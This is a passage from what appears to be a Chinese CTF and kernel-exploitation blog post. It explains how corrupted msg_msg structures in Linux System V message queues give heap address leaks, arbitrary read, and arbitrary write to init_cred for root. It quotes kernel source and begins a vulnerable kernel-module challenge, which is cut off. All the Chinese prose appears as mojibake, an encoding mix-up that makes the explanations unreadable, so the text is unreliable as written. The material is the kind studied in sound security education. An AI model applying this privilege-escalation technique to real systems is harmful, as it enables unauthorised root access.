class="comment">//......</span></span><br><span class="line">    <span class="comment">//å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"   >
          <a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="headerlink" title="A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"></a>A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–</h5>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>msg_msg</code>è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ<code>MSG_COPY</code>è¿™ä¸ª<code>msgflg</code>æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„<code>unlink</code>è§¦å‘é”™è¯¯ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®<code>CONFIG_CHECKPOINT_RESTORE=y</code>æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>ğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„<code>v5.11</code>ä¸­ï¼Œ<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº<code>copy_msg()</code>å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>æ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–<code>rdi(msg)</code>å’Œ<code>rsi(copy)</code>å¯¹åº”çš„<code>m_ts</code>è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ<code>copy</code>çš„<code>m_ts</code>æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„<code>msg</code>çš„<code>m_ts</code>é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚</p>

        <h5 id="B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"   >
          <a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="headerlink" title="B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"></a>B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–</h5>
      <p>åŒç†å¦‚æœä¸æŒ‡å®š<code>MSG_COPY</code>è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>mtype</code>å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>msgtpy</code>æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚</p>

        <h5 id="C-æ•°æ®å¤åˆ¶"   >
          <a href="#C-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-æ•°æ®å¤åˆ¶" class="headerlink" title="C.æ•°æ®å¤åˆ¶"></a>C.æ•°æ®å¤åˆ¶</h5>
      <p>ä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦<code>size</code>å°äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„<code>m_ts</code>ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨"   >
          <a href="#3-åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="è¶Šç•Œè¯»å–"   >
          <a href="#è¶Šç•Œè¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¶Šç•Œè¯»å–" class="headerlink" title="è¶Šç•Œè¯»å–"></a>è¶Šç•Œè¯»å–</h4>
      <p>è¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„<code>double-free/UAF</code>ï¼Œå¹¶ä¸”å†ä½¿ç”¨<code>setxattr</code>æ¥å¯¹<code>msg_msgmsg</code>ä¸­çš„<code>m_ts</code>è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨<code>msgrcv</code>çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚</p>
<p><strong>ä½¿ç”¨<code>setxattr</code>çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·</strong></p>
<p>ä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª<code>msg_queue</code>å’Œå•ä¸ª<code>msg_msg</code>çš„å†…å­˜æ¨¡å‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>å¯ä»¥çœ‹åˆ°å•ä¸ª<code>msg_msg</code>åœ¨<code>msg_queue</code>çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡<code>msgget</code>å’Œ<code>msgsnd</code>å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª<code>msg_msg</code>ç»“æ„ä½“çš„<code>msg_queue</code>ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª<code>msg_msg</code>çš„å¤´éƒ¨äº†</p>
<p>è€Œå•ä¸ª<code>msg_msg</code>ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘<code>msg_queue</code>çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º<code>msg_queue</code>çš„å †åœ°å€äº†ã€‚</p>

        <h4 id="ä»»æ„è¯»å–"   >
          <a href="#ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„è¯»å–" class="headerlink" title="ä»»æ„è¯»å–"></a>ä»»æ„è¯»å–</h4>
      <p>å®Œæˆä¸Šè¿°æ³„éœ²<code>msg_queue</code>çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°<code>msg_msg</code>çš„å†…å­˜å¸ƒå±€äº†</p>
<p>ç”±äºæˆ‘ä»¬çš„<code>msg_msg</code>æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>ç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>next</code>æŒ‡é’ˆå’Œ<code>m_ts</code>ï¼Œç»“åˆè¯»å–<code>msg</code>æœ€ç»ˆè°ƒç”¨å‡½æ•°<code>store_msg</code>çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°<code>msg_queue</code>ä¹‹åï¼Œå¯ä»¥å†å°†<code>msg_msg</code>çš„nextæŒ‡é’ˆæŒ‡å›<code>msg_queue</code>ï¼Œè¯»å‡ºå…¶ä¸­çš„<code>msg_msg</code>ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚</p>
<p>è¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ<code>userfaultfd</code>å’Œ<code>setxattr</code>é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚</p>
<p>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚</p>

        <h4 id="ä»»æ„å†™"   >
          <a href="#ä»»æ„å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h4>
      <p>åŒæ ·çš„ï¼Œ<code>msg_msg</code>ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ<code>msgsnd</code>ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨<code>userfaultfd</code>åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚<code>init_cred</code>ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚</p>

        <h1 id="äºŒã€ä»»æ„è¯»å†™æ¼æ´"   >
          <a href="#äºŒã€ä»»æ„è¯»å†™æ¼æ´" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€ä»»æ„è¯»å†™æ¼æ´" class="headerlink" title="äºŒã€ä»»æ„è¯»å†™æ¼æ´"></a>äºŒã€ä»»æ„è¯»å†™æ¼æ´</h1>
      <p>å†…æ ¸é‡Œçš„è¯»å†™æ¼æ´åˆ©ç”¨æ–¹å¼ä¸ç”¨æˆ·æ€æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œåˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯å¤šç§å¤šæ ·ã€‚</p>

        <h2 id="é¢˜ç›®"   >
          <a href="#é¢˜ç›®" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2>
      <p>é¦–å…ˆç»™å‡ºä¸‹é¢˜ç›®</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡</span></span><br><span class="line"><span class="comment">//static char *buffer_var = NULL;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *buffer_var = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">devClass</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> arbWriteModule_dev_no;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span 